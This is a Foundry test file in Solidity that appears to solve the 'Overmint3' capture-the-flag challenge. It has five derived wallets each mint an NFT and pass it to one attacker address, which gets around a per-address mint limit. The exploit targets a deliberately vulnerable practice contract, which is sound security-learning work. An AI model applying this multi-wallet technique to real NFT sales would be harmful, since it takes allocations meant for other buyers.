// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";

import {DeployOvermint3Script} from "@script/6_DeployOvermint3.s.sol";
import {Overmint3} from "@main/Overmint3.sol";

interface CheatCodes {

   function startPrank(address) external;
   function addr(uint256) external returns (address);
   function deriveKey(
        string calldata mnemonic,
        string calldata path,
        uint32 index
    ) external returns (uint256);

}

interface IOvermint3 {
    function totalSupply() external returns (uint256);
}

contract Overmint2Test is Test, DeployOvermint3Script {

    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);

    address public attacker = address(11);
    address[5] public attackers;

    function setUp() public {

        vm.label(attacker, "Attacker");

        string memory mnemonic ="test test test test test test test test test test test junk";
        uint256 attackerPrivateKey;

        for(uint32 i = 0; i < 5;) {
            attackerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/1/", i);
            address cachedAttacker = vm.addr(attackerPrivateKey);
            vm.label(cachedAttacker, string.concat("Attacker", Strings.toString(i)));
            attackers[i]= cachedAttacker;
            unchecked {
                i++;
            }
        }
        DeployOvermint3Script.run();
    }

    function test_isSolved() public {

        uint256 length = attackers.length;
        for(uint32 j = 0; j < length;) {

            cheats.startPrank(attackers[j]);
            overmint3Challenge.mint();
            uint256 tokenId = IOvermint3(address(overmint3Challenge)).totalSupply();
            overmint3Challenge.transferFrom(attackers[j], attacker, tokenId);

            unchecked {
                j++;
            }
            vm.stopPrank(  );
        }

        assertEq(overmint3Challenge.balanceOf(attacker), 5 );
    }

}